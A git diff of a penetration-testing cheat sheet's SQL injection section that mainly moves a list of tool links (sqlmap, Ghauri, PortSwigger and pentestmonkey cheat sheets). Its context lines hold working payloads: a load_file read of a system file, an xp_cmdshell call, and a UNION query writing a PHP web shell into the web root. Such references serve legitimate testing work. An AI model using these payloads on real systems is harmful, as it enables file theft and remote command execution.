@@ -1524,7 +1524,13 @@ You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscov
 
 ## Web vulnerabilities
 
-### <ins>SQL injection</ins>
+### <ins>SQL Injection</ins>
+
+**Tools**
+- [SQL injection cheat sheet  | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+- [SQL Injection cheat sheets | pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
+- [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
+- [Ghauri](https://github.com/r0oth3x49/ghauri)
 
 **How to identify SQL injections**: Search for SQL errors, use the apex or the backtick character in parameters and analyze the response.
 
@@ -1579,12 +1585,6 @@ Using the `load_file` function: `?id=1 union all select 1, 2, load_file('C:/Wind
   xp_cmdshell 'COMMAND';
   ```
 - Write a PHP shell using the `OUTFILE` function: `?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`. Then access `backdoor.php&cmd=ipconfig`.
-
-**Tools**
-- [SQL injection cheat sheet  | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-- [SQL Injection cheat sheets | pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
-- [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
-- [Ghauri](https://github.com/r0oth3x49/ghauri)
 
 **sqlmap**
 ```
